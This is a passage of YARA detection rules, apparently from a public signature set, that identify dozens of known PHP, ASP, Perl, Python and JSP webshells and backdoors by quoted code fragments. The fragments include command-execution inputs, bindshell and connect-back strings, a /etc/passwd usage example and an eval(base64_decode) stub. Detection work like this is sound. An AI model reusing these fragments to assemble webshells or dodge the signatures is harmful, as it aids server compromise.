      $s1 = "NGH edition" 
      $s2 = "/* connectback-backdoor on perl" 
      $s3 = "<form action=<?=$script?>?act=bindshell method=POST>" 
      $s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r" 
   condition: 
      1 of them
} 

rule Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 22:00:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend" 
      $s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
      $s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora" 
   condition: 
      1 of them
} 

rule Webshell_RemExp_asp_RID2E9A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file RemExp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<title>Remote Explorer</title>" 
      $s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi" 
      $s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
   condition: 
      2 of them
} 

rule Webshell_klasvayv_asp_RID2FBA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file klasvayv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "set aktifklas=request.querystring(\"aktifklas\")" 
      $s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" 
      $s3 = "<font color=\"#858585\">www.aventgrup.net" 
      $s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT" 
   condition: 
      1 of them
} 

rule Webshell_wh_bindshell_py_RID30E1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file wh_bindshell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#Use: python wh_bindshell.py [port] [password]" 
      $s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
      $s3 = "#bugz: ctrl+c etc =script stoped=" fullword
   condition: 
      1 of them
} 

rule Webshell_lurm_safemod_on_cgi_RID3272 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lurm_safemod_on.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:05:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Network security team :: CGI Shell" fullword
      $s1 = "#########################<<KONEC>>#####################################" fullword
      $s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
   condition: 
      1 of them
} 

rule Webshell_backupsql_php_often_with_c99shell_RID37F5 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backupsql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 18:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ." 
      $s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog" 
   condition: 
      all of them
} 

rule Webshell_uploader_php_php_RID3150 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file uploader.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
      $s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
      $s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
   condition: 
      2 of them
} 

rule Webshell_Dx_php_php_RID2EB0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Dx.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util" 
      $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP" 
   condition: 
      1 of them
} 

rule Webshell_Rem_View_php_php_RID3112 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Rem View.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\"" 
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "Welcome to phpRemoteView (RemView)" 
   condition: 
      1 of them
} 

rule Webshell_Java_Shell_js_RID2FBB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Java Shell.js.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
      $s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
      $s4 = "public static int DEFAULT_SCROLLBACK = 100" 
   condition: 
      2 of them
} 

rule Webshell_STNC_php_php_RID2F2C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file STNC.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "drmist.ru" fullword
      $s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80" 
      $s2 = "STNC WebShell" 
      $s3 = "http://www.security-teams.net/index.php?showtopic=" 
   condition: 
      1 of them
} 

rule Webshell_aZRaiLPhp_v1_0_php_RID312D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "azrailphp" 
      $s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>" 
      $s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>" 
   condition: 
      2 of them
} 

rule Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ";$sd98=\"john.barker446@gmail.com\"" 
      $s1 = "print \"Sending mail to $to....... \";" 
      $s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei" 
   condition: 
      1 of them
} 

rule Webshell_simple_backdoor_php_RID327B : DEMO MAL T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file simple-backdoor.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" 
      $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
   condition: 
      2 of them
} 

rule Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Emperor Hacking TEAM" 
      $s1 = "Simshell" fullword
      $s2 = "ereg('^[[:blank:]]*cd[[:blank:]]" 
      $s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST" 
   condition: 
      2 of them
} 

rule Webshell_Asmodeus_v0_1_pl_RID30B7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Asmodeus v0.1.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[url=http://www.governmentsecurity.org" 
      $s1 = "perl asmodeus.pl client 6666 127.0.0.1" 
      $s2 = "print \"Asmodeus Perl Remote Shell" 
      $s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
   condition: 
      2 of them
} 

rule Webshell_phpshell17_php_RID3015 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpshell17.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
      $s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></" 
      $s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
   condition: 
      1 of them
} 

rule Webshell_myshell_php_php_RID30F2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file myshell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory." 
      $s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color" 
      $s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$" 
   condition: 
      2 of them
} 

rule Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:07:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Simorgh Security Magazine " 
      $s1 = "Simshell.css" 
      $s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], " 
      $s3 = "www.simorgh-ev.com" 
   condition: 
      2 of them
} 

rule Webshell_rootshell_php_RID3029 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rootshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "shells.dl.am" 
      $s1 = "This server has been infected by $owner" 
      $s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>" 
      $s4 = "Could not write to file! (Maybe you didn't enter any text?)" 
   condition: 
      2 of them
} 

rule Webshell_connectback2_pl_RID308E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file connectback2.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   " 
      $s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel" 
      $s2 = "ConnectBack Backdoor" 
   condition: 
      1 of them
} 

rule Webshell_DefaceKeeper_0_2_php_RID3201 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DefaceKeeper_0.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
      $s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9" 
      $s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center" 
   condition: 
      1 of them
} 

rule Webshell_backdoor1_php_RID2FC3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backdoor1.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:11:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".." 
      $s2 = "class backdoor {" 
      $s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <" 
   condition: 
      1 of them
} 

rule Webshell_elmaliseker_asp_RID30D7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file elmaliseker.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\"" 
      $s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">" 
      $s2 = "dim zombie_array,special_array" 
      $s3 = "http://vnhacker.org" 
   condition: 
      1 of them
} 

rule Webshell_s72_Shell_v1_1_Coding_html_RID3436 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><" 
      $s1 = "s72 Shell v1.0 Codinf by Cr@zy_King" 
      $s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\"" 
   condition: 
      1 of them
} 

rule Webshell_Antichat_Socks5_Server_php_php_RID368D : DEMO T1090 T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1090, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
      $s3 = "#   [+] Domain name address type" 
      $s4 = "www.antichat.ru" 
   condition: 
      1 of them
} 

rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy" 
      $s1 = "Mode Shell v1.0</font></span>" 
      $s2 = "has been already loaded. PHP Emperor <xb5@hotmail." 
   condition: 
      1 of them
} 

rule Webshell_mysql_php_php_RID302A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "action=mysqlread&mass=loadmass\">load all defaults" 
      $s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru" 
      $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = " 
   condition: 
      1 of them
} 

rule Webshell_Worse_Linux_Shell_php_RID3323 : DEMO LINUX T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Worse Linux Shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, LINUX, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td" 
      $s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd" 
   condition: 
      1 of them
} 

rule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cyberlords_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:05:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Coded by n0 [nZer0]" 
      $s1 = " www.cyberlords.net" 
      $s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE" 
      $s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);" 
   condition: 
      1 of them
} 

rule Webshell_pws_php_php_RID2F4E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pws.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
      $s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
      $s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>" 
   condition: 
      2 of them
} 

rule Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Ayyildiz" 
      $s1 = "TouCh By iJOo" 
      $s2 = "First we check if there has been asked for a working directory" 
      $s3 = "http://ayyildiz.org/images/whosonline2.gif" 
   condition: 
      2 of them
} 

rule Webshell_Ajax_PHP_Command_Shell_php_RID348D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>" 
      $s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help" 
      $s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct" 
   condition: 
      1 of them
} 

rule Webshell_JspWebshell_1_2_jsp_RID31D6 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file JspWebshell 1.2.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:39:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "JspWebshell" 
      $s1 = "CreateAndDeleteFolder is error:" 
      $s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c" 
      $s3 = "String _password =\"111\";" 
   condition: 
      2 of them
} 

rule Webshell_Phyton_Shell_py_RID30C7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Phyton Shell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:54:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
      $s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
      $s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
      $s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
   condition: 
      1 of them
} 

rule Webshell_mysql_tool_php_php_RID3247 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_tool.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['" 
      $s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV" 
      $s4 = "<div align=\"center\">The backup process has now started<br " 
   condition: 
      1 of them
} 

rule Webshell_phpbackdoor15_php_RID3140 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpbackdoor15.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na" 
      $s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI" 
      $s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s" 
   condition: 
      1 of them
} 

rule Webshell_ru24_post_sh_php_php_RID32A0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ru24_post_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
      $s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a" 
      $s4 = "Writed by DreAmeRz" fullword
   condition: 
      1 of them
} 

rule Webshell_DTool_Pro_php_RID2FBF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DTool Pro.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "r3v3ng4ns\\nDigite" 
      $s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi" 
      $s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n" 
   condition: 
      1 of them
} 

rule Webshell_php_include_w_shell_php_RID3425 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file php-include-w-shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd" 
      $s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB" 
   condition: 
      1 of them
} 

rule Webshell_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php_RID3D04 : DEMO T1100 T1136 WEBSHELL {
   meta:
